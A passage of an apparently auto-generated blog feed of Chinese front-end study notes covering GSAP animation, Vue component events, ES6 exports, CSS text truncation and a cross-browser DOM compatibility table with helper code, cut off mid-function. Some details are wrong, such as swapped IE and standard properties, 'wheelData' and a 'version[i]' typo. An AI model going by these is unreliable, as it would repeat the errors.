多一些功能"></a><code>TimelineMax</code>和<code>TweenMax</code> 多一些功能</h2><pre><code>repeat, yoyo:BooleanrepeatDelay and more.</code></pre><p><code>TimelineMax</code> 还有方法</p><pre><code>tweenTo(), currentLabel(),getLabelBefore() getLabelAfter() and more.</code></pre><h2 id="Overwriting-other-tweens"><a href="#Overwriting-other-tweens" class="headerlink" title="Overwriting other tweens"></a>Overwriting other tweens</h2><p> all,none,auto</p><p>TweenLite.defaultOverwrite = “all”;</p><h2 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h2><p> stagger可以让多个元素执行同一个动画</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;突然看到有H5页面外快做，看到微信朋友圈发的那些H5页面里面都用的了TweenMax，所以来研究一下，结果吓一跳，太太太强大了！！！！&lt;/p&gt;
&lt;h1 id=&quot;复习一下CSS3&quot;&gt;&lt;a href=&quot;#复习一下CSS3&quot; class=&quot;headerlink&quot; title=&quot;复
      
    
    </summary>
    
      <category term="学习" scheme="http://lry1994.github.io/categories/%E5%AD%A6%E4%B9%A0/"/>
    
      <category term="专题笔记" scheme="http://lry1994.github.io/categories/%E5%AD%A6%E4%B9%A0/%E4%B8%93%E9%A2%98%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="H5" scheme="http://lry1994.github.io/tags/H5/"/>
    
      <category term="GreenSock" scheme="http://lry1994.github.io/tags/GreenSock/"/>
    
  </entry>
  
  <entry>
    <title>2018-3总结</title>
    <link href="http://lry1994.github.io/study/2018/3/suibi.html"/>
    <id>http://lry1994.github.io/study/2018/3/suibi.html</id>
    <published>2018-02-28T16:00:00.000Z</published>
    <updated>2018-08-30T02:32:56.362Z</updated>
    
    <content type="html"><![CDATA[<h3 id="给点击路由的时候加上监听事件"><a href="#给点击路由的时候加上监听事件" class="headerlink" title="给点击路由的时候加上监听事件"></a>给点击路由的时候加上监听事件</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">router-link</span> <span class="attr">class</span>=<span class="string">"my-link"</span> <span class="attr">:to</span>=<span class="string">"&#123;name: 'main.provider.index', params: &#123;providerId: scope.row.providerId&#125;&#125;"</span>&gt;</span>提供者主页<span class="tag">&lt;/<span class="name">router-link</span>&gt;</span></span><br></pre></td></tr></table></figure><pre><code>解决方法：&gt; 给组件绑定原生事件    有时候，你可能想在某个组件的根元素上监听一个原生事件。可以使用 v-on 的修饰符 .native。例如：    &lt;my-component v-on:click.native=&quot;doTheThing&quot;&gt;&lt;/my-component&gt;</code></pre><p>参考连接<br><a href="https://segmentfault.com/q/1010000007896386" target="_blank" rel="noopener">给组件绑定原生事件</a></p><h3 id="块内元素文字上下居中"><a href="#块内元素文字上下居中" class="headerlink" title="块内元素文字上下居中"></a>块内元素文字上下居中</h3><p>line-height设置为height的值</p><h3 id="export及export-default的区别"><a href="#export及export-default的区别" class="headerlink" title="export及export default的区别"></a>export及export default的区别</h3><p>在一个文件或模块中，export可以有多个，export default仅有一个。 </p><ul><li>export</li></ul><p>(1) 导入的时候带花括号</p><pre><code><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 写法一</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">var</span> m = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 写法二</span></span><br><span class="line"><span class="keyword">var</span> m = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">export</span> &#123;m&#125;; <span class="comment">//export m 或者export 1都错误</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 写法三</span></span><br><span class="line"><span class="keyword">var</span> n = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">export</span> &#123;n <span class="keyword">as</span> m&#125;;</span><br></pre></td></tr></table></figure></code></pre><p>(2) export命令规定的是对外的接口，必须与模块内部的变量建立一一对应关系。</p><ul><li>export default </li></ul><p>(1) 导入的时候没有花括号</p><pre><code><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> str <span class="keyword">from</span> <span class="string">'demo1'</span> <span class="comment">//导入的时候没有花括号</span></span><br></pre></td></tr></table></figure></code></pre><p>(2) export default命令的本质是将后面的值，赋给default变量，所以可以直接将一个值写在export default之后。</p><h3 id="用refs来组件通信"><a href="#用refs来组件通信" class="headerlink" title="用refs来组件通信"></a>用refs来组件通信</h3><p>在讨论非父子通信的时候，并在没有用Vuex的情况下，我是用官网那种创建Vue实例的方法，但是同事提到了另一种方法<br>用refs来引用，不禁一想这好像也是一种解决方案，就是觉得怪怪的。在这里记录一下</p><h3 id="关于第4点，今天工作用了this-refs来传播事件，类似于-brocast-但是VUE2把-brocast废除了。"><a href="#关于第4点，今天工作用了this-refs来传播事件，类似于-brocast-但是VUE2把-brocast废除了。" class="headerlink" title="关于第4点，今天工作用了this.$refs来传播事件，类似于$brocast,但是VUE2把$brocast废除了。"></a>关于第4点，今天工作用了this.$refs来传播事件，类似于$brocast,但是VUE2把$brocast废除了。</h3><p>总结一下vue传播事件</p><p>(1) 子组件传播事件给父组件，用<code>$on,$emit</code>.</p><p>虽然说是这样说，但是不是直接在父组件里面写$on的,应该是这样</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">parent</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">child</span> @<span class="attr">eventname</span>=<span class="string">"event"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br></pre></td></tr></table></figure><p>然后在parent组件里面写 event函数.event(){}</p><p>子组件调用的时候用<code>this.$emit(&#39;eventname&#39;,payload)</code></p><p>(2)父组件传播事件给子组件，用 <code>$refs</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">parent</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">child</span> <span class="attr">ref</span>=<span class="string">"refname"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">parant</span>&gt;</span></span><br></pre></td></tr></table></figure><p>调用的时候用<code>this.$ref[&#39;refname&#39;].eventname()</code></p><p>(3)上面有种都麻烦的话，创建实例bus</p><h3 id="js的数组可以是这样的形式"><a href="#js的数组可以是这样的形式" class="headerlink" title="js的数组可以是这样的形式"></a>js的数组可以是这样的形式</h3><p><code>(4) [{…}, {…}, {…}, {…}, total: 4, code: &quot;core.ok&quot;]</code></p><p>他的length是4</p><h3 id="把字符串转换成数字可以用数字运算符-但是-不行"><a href="#把字符串转换成数字可以用数字运算符-但是-不行" class="headerlink" title="把字符串转换成数字可以用数字运算符,但是 + 不行"></a>把字符串转换成数字可以用数字运算符,但是 + 不行</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="string">"2"</span>&gt;&gt;&gt;<span class="number">0</span>)  <span class="comment">//2 number </span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"2"</span>&gt;&gt;<span class="number">0</span>)  <span class="comment">//2 number </span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"2"</span>&lt;&lt;<span class="number">0</span>)  <span class="comment">//2 number  没有（&lt;&lt;&lt;）</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"2"</span>- <span class="number">0</span>)    <span class="comment">//2 number</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"2"</span>+<span class="number">0</span>)    <span class="comment">//20 string</span></span><br></pre></td></tr></table></figure><h3 id="reduce函数好好用"><a href="#reduce函数好好用" class="headerlink" title="reduce函数好好用"></a>reduce函数好好用</h3><p>今天写了一个有重大作用的reduce函数，好开心。在此纪念一下</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//str &#123;String&#125;, "app.get.logo.list"</span></span><br><span class="line"><span class="comment">//ctx &#123;Object&#125;,  this._$http</span></span><br><span class="line"><span class="comment">//return &#123;Object&#125;, this._$http.app.get.logo.list</span></span><br><span class="line"> getBackend(str)&#123;</span><br><span class="line">        <span class="keyword">const</span> arr = <span class="keyword">this</span>.loadBackend.split(<span class="string">'.'</span>);</span><br><span class="line">        <span class="keyword">let</span> ctx= <span class="keyword">this</span>._$http;</span><br><span class="line">        <span class="keyword">let</span> a;</span><br><span class="line">        <span class="keyword">let</span> b=arr.reduce(<span class="function">(<span class="params">prev, cur, idx</span>) =&gt;</span> &#123;        </span><br><span class="line">              a = prev[cur] ;         </span><br><span class="line">            <span class="keyword">return</span> a;</span><br><span class="line">        &#125;,ctx);              </span><br><span class="line">          <span class="keyword">return</span> b;      </span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure><h3 id="用mpVue开发小程序了"><a href="#用mpVue开发小程序了" class="headerlink" title="用mpVue开发小程序了"></a>用mpVue开发小程序了</h3><p><a href="https://www.itcodemonkey.com/article/2573.html" target="_blank" rel="noopener">https://www.itcodemonkey.com/article/2573.html</a></p><h3 id="vue项目中全局引入scss文件的方法"><a href="#vue项目中全局引入scss文件的方法" class="headerlink" title="vue项目中全局引入scss文件的方法"></a>vue项目中全局引入scss文件的方法</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">npm install node-sass --save-dev</span><br><span class="line">npm install sass-loader --save-dev</span><br><span class="line">npm install sass-resources-loader --save-dev</span><br></pre></td></tr></table></figure><p>修改build/utils.js<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">scss: generateLoaders(<span class="string">'sass'</span>).concat(</span><br><span class="line">      &#123;</span><br><span class="line">        loader: <span class="string">'sass-resources-loader'</span>,</span><br><span class="line">        options: &#123;</span><br><span class="line">          resources: path.resolve(__dirname, <span class="string">'../src/assets/your.scss'</span>)</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    )</span><br></pre></td></tr></table></figure></p><h3 id="elementUI的layout问题"><a href="#elementUI的layout问题" class="headerlink" title="elementUI的layout问题"></a>elementUI的layout问题</h3><p>el-footer会直接fixed在窗口底部，不好看，</p><p>解决方法：el-footer放到el-main里面<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">el-container</span> <span class="attr">style</span>=<span class="string">"height:100%;"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">el-header</span> <span class="attr">class</span>=<span class="string">"header"</span> <span class="attr">style</span>=<span class="string">"height:100px"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">cty-navbar</span> <span class="attr">:navs</span>=<span class="string">"navs"</span>&gt;</span><span class="tag">&lt;/<span class="name">cty-navbar</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">el-header</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">el-main</span>&gt;</span>      </span><br><span class="line">        <span class="tag">&lt;<span class="name">el-scrollbar</span> <span class="attr">wrap-style</span>=<span class="string">"overflow-x:hidden;"</span> <span class="attr">style</span>=<span class="string">"min-height: 800px"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">router-view</span>&gt;</span><span class="tag">&lt;/<span class="name">router-view</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span>           </span><br><span class="line">        <span class="tag">&lt;/<span class="name">el-scrollbar</span>&gt;</span></span><br><span class="line">                        </span><br><span class="line">        <span class="tag">&lt;<span class="name">el-footer</span> <span class="attr">class</span>=<span class="string">"footer"</span> <span class="attr">style</span>=<span class="string">"height:70px"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">cty-footer</span>&gt;</span><span class="tag">&lt;/<span class="name">cty-footer</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">el-footer</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">el-main</span>&gt;</span></span><br><span class="line">        </span><br><span class="line"><span class="tag">&lt;/<span class="name">el-container</span>&gt;</span></span><br></pre></td></tr></table></figure></p><h3 id="vue路由刷新问题，两个路由对应一个组件，如何能让路由重载"><a href="#vue路由刷新问题，两个路由对应一个组件，如何能让路由重载" class="headerlink" title="vue路由刷新问题，两个路由对应一个组件，如何能让路由重载"></a>vue路由刷新问题，两个路由对应一个组件，如何能让路由重载</h3><p><a href="https://segmentfault.com/q/1010000010844655" target="_blank" rel="noopener">https://segmentfault.com/q/1010000010844655</a></p><p>写在共用组件文件里</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">data()&#123;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br><span class="line">mounted()&#123;...&#125;,</span><br><span class="line"> watch: &#123;          </span><br><span class="line">            $route: &#123;</span><br><span class="line">                handler: <span class="function"><span class="keyword">function</span> (<span class="params">val, oldVal</span>) </span>&#123;</span><br><span class="line">                    <span class="keyword">this</span>.worksheet_type = <span class="keyword">this</span>.$route.params.type;                     </span><br><span class="line">                &#125;,</span><br><span class="line">                deep: <span class="literal">true</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br></pre></td></tr></table></figure><p>在共用组件上加上key<br><code>&lt;div :key=&quot;$route.path&quot;&gt;</code></p><h3 id="单行文本超出隐藏并显示省略号"><a href="#单行文本超出隐藏并显示省略号" class="headerlink" title="单行文本超出隐藏并显示省略号"></a>单行文本超出隐藏并显示省略号</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.element</span>&#123;</span><br><span class="line"><span class="attribute">width</span>: <span class="number">20em</span>;<span class="comment">/*不允许出现半汉字截断*/</span></span><br><span class="line"><span class="attribute">overflow</span>: hidden; <span class="comment">/*自动隐藏文字*/</span></span><br><span class="line"><span class="attribute">text-overflow</span>: ellipsis;<span class="comment">/*文字隐藏后添加省略号*/</span></span><br><span class="line"><span class="attribute">white-space</span>: nowrap;<span class="comment">/*强制不换行*/</span></span><br></pre></td></tr></table></figure><h3 id="多行文字隐藏加省略号"><a href="#多行文字隐藏加省略号" class="headerlink" title="多行文字隐藏加省略号"></a>多行文字隐藏加省略号</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.element</span>&#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">20em</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">3em</span>;<span class="comment">/*注意高度和宽度，不允许出现半汉字截断*/</span></span><br><span class="line">    <span class="attribute">line-height</span>: <span class="number">1.5em</span>;</span><br><span class="line">    <span class="attribute">overflow</span>: hidden;</span><br><span class="line">    <span class="attribute">display</span>: -webkit-box;</span><br><span class="line">    <span class="attribute">-webkit-line-clamp</span>: <span class="number">3</span>;</span><br><span class="line">    <span class="attribute">-webkit-box-orient</span>: vertical;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;给点击路由的时候加上监听事件&quot;&gt;&lt;a href=&quot;#给点击路由的时候加上监听事件&quot; class=&quot;headerlink&quot; title=&quot;给点击路由的时候加上监听事件&quot;&gt;&lt;/a&gt;给点击路由的时候加上监听事件&lt;/h3&gt;&lt;figure class=&quot;highlight 
      
    
    </summary>
    
      <category term="学习" scheme="http://lry1994.github.io/categories/%E5%AD%A6%E4%B9%A0/"/>
    
      <category term="每月总结" scheme="http://lry1994.github.io/categories/%E5%AD%A6%E4%B9%A0/%E6%AF%8F%E6%9C%88%E6%80%BB%E7%BB%93/"/>
    
    
      <category term="vue" scheme="http://lry1994.github.io/tags/vue/"/>
    
      <category term="ES6" scheme="http://lry1994.github.io/tags/ES6/"/>
    
  </entry>
  
  <entry>
    <title>原生DOM兼容特性总结</title>
    <link href="http://lry1994.github.io/study/2018/2/26-dom-compaticity.html"/>
    <id>http://lry1994.github.io/study/2018/2/26-dom-compaticity.html</id>
    <published>2018-02-25T16:00:00.000Z</published>
    <updated>2018-07-02T01:43:16.866Z</updated>
    
    <content type="html"><![CDATA[<p>浏览器主要也就是IE有点独特，所以把IE重点区分开</p><table><thead><tr><th>名称</th><th style="text-align:left">主流</th><th style="text-align:left">IE</th></tr></thead><tbody><tr><td>内文本</td><td style="text-align:left">innerText</td><td style="text-align:left">textContent</td></tr><tr><td>请求对象</td><td style="text-align:left">XMLHttpRequest</td><td style="text-align:left">ActiveXObject<br>[“MSXML2.XMLHttp.6.0”,”MSXML2.XMLHttp.3.0”,”MSXML2.XMLHttp”]</td></tr><tr><td>监听事件添加</td><td style="text-align:left">addEventListener(DOM2),<br> [\’on\’+eventName](DOM0)</td><td style="text-align:left">attachEvent</td></tr><tr><td>监听事件移除</td><td style="text-align:left">removeEventListener(DOM2),<br>[‘on’+eventName]=null(DOM0)</td><td style="text-align:left">detachEvent</td></tr><tr><td>事件对象</td><td style="text-align:left">function(e) e</td><td style="text-align:left">window.event(IE7之前)</td></tr><tr><td>阻止默认事件</td><td style="text-align:left">preventDefault</td><td style="text-align:left">e.returnValue=false</td></tr><tr><td>阻止冒泡</td><td style="text-align:left">stopPropagation</td><td style="text-align:left">e.cancelBubble=true</td></tr><tr><td>键盘事件键盘编码</td><td style="text-align:left">e.charCode</td><td style="text-align:left">e.keyCode</td></tr><tr><td>获取剪贴板的文本</td><td style="text-align:left">e.clipboardData</td><td style="text-align:left">window.clipboardData</td></tr><tr><td>设置剪贴板文本</td><td style="text-align:left">e.clipboardData.setData(“text/plain”,value);</td><td style="text-align:left">window.clipboardData.setData(“text”,value);</td></tr><tr><td>触发事件的元素</td><td style="text-align:left">e.target</td><td style="text-align:left">e.srcElement</td></tr><tr><td>获取样式</td><td style="text-align:left">getComputedStyle(obj,false)[attr];(Firefox浏览器)<br> obj.style.attr(只对filter,opacity等有效)<br>obj.style[attr]</td><td style="text-align:left">obj.currentStyle[attr];</td></tr><tr><td>窗口左边的位置</td><td style="text-align:left">window.screenLeft</td><td style="text-align:left">window.screenX</td></tr><tr><td>页面视口大小</td><td style="text-align:left">window.innerHeight</td><td style="text-align:left">if(document.compatMode==”CSS1Compat”)window.documentElement.clientHeight;<br> if(document.compatMode==”BackCompat”)window.body.clientHeight<br></td></tr><tr><td>获取元素</td><td style="text-align:left">document.getElementById(id);</td><td style="text-align:left">document.all[id];(IE5)</td></tr><tr><td>返回指定的属性</td><td style="text-align:left">ele.getAttribute(attr)</td><td style="text-align:left">ele.attribute[attr]</td></tr><tr><td>ele是否存在指定属性 attr</td><td style="text-align:left">ele.hasAttribute(attr)</td><td style="text-align:left">ele.attributes[attr].specified;</td></tr><tr><td>鼠标滚动，正数表示向上滚动</td><td style="text-align:left">function getWheelDelta(e){<br>if(e.wheelData){<br>return (client.engine.opera&amp;&amp;client.engine.opera&lt;9.5)?<br>-e.wheelData:e.wheelData;<br>}else {<br>return -e.detail*40;//firefox<br>}<br>}</td><td style="text-align:left"></td></tr><tr><td>提取选中的文本</td><td style="text-align:left">textbox.value.subString(textbox.selectionStart,textbox.selectionEnd);</td><td style="text-align:left">document.selection.createRange().text;<br>(IE8之前没有selectionStart，selectionEnd属性</td><td></td></tr><tr><td>设置文本选中</td><td style="text-align:left">textbox.setSelectionRange(startIndex,stopIndex);</td><td style="text-align:left">var range=textbox.createTextRange();<br>range.collapse(true);<br>range.moveStart(“character”,0);<br>range.moveEnd(“character”,stopIndex-startIndex);<br>range.select()</td></tr></tbody></table><p>下面是积累下来的一些兼容函数，可以当做模板用</p><ul><li><a href="#添加多个onload事件">添加多个onload事件</a></li><li><a href="#处理ActiveXObject/XMLHttpRequest问题">处理ActiveXObject/XMLHttpRequest问题</a></li><li><a href="#请求对象的属性和方法设置">请求对象的属性和方法设置</a></li><li><a href="#发送表单数据">发送表单数据</a></li><li><a href="#跨浏览器的CORS">跨浏览器的CORS</a></li><li><a href="#跨浏览器事件处理程序">跨浏览器事件处理程序</a></li><li><a href="#处理target/srcelemnt问题，代替this">处理target/srcelemnt问题，代替this</a></li><li><a href="#实现insertAfter">实现insertAfter</a></li><li><a href="#给element加上类名">给element加上类名</a></li><li><a href="#判断是不是数组">判断是不是数组</a></li><li><a href="#IE10之前不支持docunment.getElementByClassName">IE10之前不支持docunment.getElementByClassName</a></li><li><a href="#获取css样式">获取css样式</a></li><li><a href="#手写动画">手写动画</a></li><li><a href="#取得窗口左边和上边的位置">取得窗口左边和上边的位置</a></li><li><a href="#取得页面视口大小">取得页面视口大小</a></li><li><a href="#检测插件方法">检测插件方法</a></li><li><a href="#获取元素">获取元素</a></li><li><a href="#检查对象的某个特性是否存在">检查对象的某个特性是否存在</a></li><li><a href="#对象转换成数组">对象转换成数组</a></li><li><a href="#返回指定的属性">返回指定的属性</a></li><li><a href="#ele是否存在指定属性">ele是否存在指定属性</a></li><li><a href="#ele是否符合选择器selector">ele是否符合选择器selector</a></li><li><a href="#获取内文本">获取内文本</a></li><li><a href="#获取鼠标事件的父元素">获取鼠标事件的父元素</a></li><li><a href="#探测按的是鼠标的哪个键">探测按的是鼠标的哪个键</a></li><li><a href="#鼠标滚动事件">鼠标滚动事件</a></li><li><a href="#提取选中的文本">提取选中的文本</a></li><li><a href="#设置文本选中">设置文本选中</a></li><li><a href="#bind方法对老版本的浏览器不起作用">bind方法对老版本的浏览器不起作用</a></li><li><a href="#包装cookie">包装cookie</a></li><li><a href="#包装子cookie">包装子cookie</a></li><li><a href="#indexedDB">indexedDB</a></li><li><a href="#手写typeof">手写typeof</a></li><li><a href="#深度克隆">深度克隆</a></li><li><a href="#组合使用构造函数模式和原型模式创建对象">组合使用构造函数模式和原型模式创建对象</a></li><li><a href="#组合继承">组合继承</a></li><li><a href="#观察者模式">观察者模式</a></li><li><a href="#分享一个题目">分享一个题目</a></li></ul><h2 id="添加多个onload事件"><a href="#添加多个onload事件" class="headerlink" title="添加多个onload事件"></a>添加多个onload事件</h2> <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addLoadEvent</span>(<span class="params">func</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> oldonload=<span class="built_in">window</span>.onload;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">typeof</span> <span class="built_in">window</span>.onload!= <span class="string">'function'</span>)&#123;</span><br><span class="line">        <span class="built_in">window</span>.onload=func;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">window</span>.onload=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            oldonload();</span><br><span class="line">            func();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="处理ActiveXObject-XMLHttpRequest问题"><a href="#处理ActiveXObject-XMLHttpRequest问题" class="headerlink" title="处理ActiveXObject/XMLHttpRequest问题"></a>处理ActiveXObject/XMLHttpRequest问题</h2> <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//第一种写法，《js高级程序设计》的写法  惰性载入技巧</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">createXHR</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">typeof</span> XMLHttpRequest!=<span class="string">"undefined"</span>)&#123;<span class="comment">//XMLHttpRequest</span></span><br><span class="line">createXHR=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">&#125;;</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">typeof</span> ActiveXObject!=<span class="string">"undefined"</span>)&#123;<span class="comment">//IE ActiveXObject</span></span><br><span class="line">createXHR=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">typeof</span> <span class="built_in">arguments</span>.callee.activeXString!=<span class="string">"string"</span>)&#123;</span><br><span class="line"><span class="keyword">var</span> versions=[<span class="string">"MSXML2.XMLHttp.6.0"</span>,<span class="string">"MSXML2.XMLHttp.3.0"</span>,<span class="string">"MSXML2.XMLHttp"</span>],<span class="comment">//IE</span></span><br><span class="line">    i,len;</span><br><span class="line"> <span class="keyword">for</span>(i=<span class="number">0</span>,len=versions.length;i&lt;len;i++)&#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">    <span class="keyword">new</span> ActiveXObject(versions[i]);</span><br><span class="line">    <span class="built_in">arguments</span>.callee.activeXString=version[i];</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">    &#125;<span class="keyword">catch</span>(ex)&#123;&#125;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> ActiveXObject(<span class="built_in">arguments</span>.callee.activeXString);</span><br><span class="line">&#125;;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">createXHR=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">"fail"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> createXHR();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//第二种写法</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">createXHR</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">typeof</span> XMLHttpRequest==<span class="string">"undefined"</span>)&#123;</span><br><span class="line">        XMLHttpRequest= <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span 